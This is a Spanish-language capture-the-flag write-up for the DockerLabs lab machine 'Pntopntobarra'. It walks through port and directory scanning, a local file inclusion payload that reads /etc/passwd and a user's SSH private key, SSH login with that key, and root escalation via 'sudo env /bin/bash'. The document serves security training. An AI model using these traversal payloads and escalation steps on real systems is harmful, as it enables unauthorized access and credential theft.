## Introducción

Este documento presenta la resolución completa de la máquina **Pntopntobarra**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web con una página que presenta imágenes de manera dinámica mediante un parámetro vulnerable a **Local File Inclusion (LFI)**. Esta vulnerabilidad permite leer archivos del sistema, incluyendo la clave privada SSH del usuario `nico` almacenada en `~/.ssh/id_rsa`.
Con la clave privada, se accede al sistema vía SSH como `nico`. Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `env` como root sin autenticación, facilitando una escalada de privilegios directa a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Pntopntobarra.zip
sudo bash auto_deploy.sh Pntopntobarra.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Pntopntobarra/{content,exploits,nmap,scripts}
cd Pntopntobarra
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762913789/Ports_ujufeh.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762913789/Gobuster_r3pzyh.png)

**Ruta encontrada:**
- `/index` — Página principal con dos botones.

![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762913789/Index_paycvi.png)

Uno de los botones dirige a una sección con ejemplos de computadoras infectadas:

![Examples](https://res.cloudinary.com/dewqswzke/image/upload/v1762913789/Examples_yizvx5.png)

Se observa un error al cargar imágenes, lo que sugiere la manipulación del parámetro `images`.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Confirmación de LFI

Se prueba un posible **Local File Inclusion (LFI)** modificando el parámetro `images`:

```
http://172.17.0.2/ejemplos.php?images=../../../etc/passwd
```

![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1762913790/TrasversalPath_txuxm7.png)

La lectura es exitosa y revela el usuario **nico**.

### 2.2 Extracción de clave privada SSH

Se lee la clave privada SSH del usuario `nico`:

```
http://172.17.0.2/ejemplos.php?images=../../../home/nico/.ssh/id_rsa
```

![RSA](https://res.cloudinary.com/dewqswzke/image/upload/v1762913790/RsaKey_jcjanv.png)

Se guarda la clave con permisos adecuados:

```bash
chmod 600 id_rsa
```

### 2.3 Acceso SSH

Se accede al sistema:

```bash
ssh -i id_rsa nico@172.17.0.2
```

![Nico](https://res.cloudinary.com/dewqswzke/image/upload/v1762913789/NicoLogin_hwlhed.png)

## Paso 3 — Escalada de privilegios

### 3.1 De nico → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762913790/Sudo-l_a2t9oo.png)

El usuario puede ejecutar `env` como root sin contraseña.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b env -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo env /bin/bash
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762913790/Root_zqfkmj.png)
